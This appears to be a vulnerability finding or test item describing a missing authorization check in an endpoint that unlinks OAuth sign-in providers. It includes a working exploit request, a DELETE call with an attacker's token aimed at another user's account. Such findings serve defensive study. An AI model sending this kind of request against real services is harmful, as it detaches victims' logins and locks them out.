diagnosis: The endpoint unlinks an OAuth federated provider from a user account specified by the user_id path parameter. It does not verify that current_user.id is equal to user_id, allowing an attacker to detach third-party sign-in providers (e.g., Google or GitHub) from victim accounts, locking them out of their logins.
exploit_request:
DELETE /users/41e46f01-9a70-4bf7-814d-93cc10e051fb/oauth/google HTTP/1.1
Host: api.authservice.io
Authorization: Bearer <attacker_token>
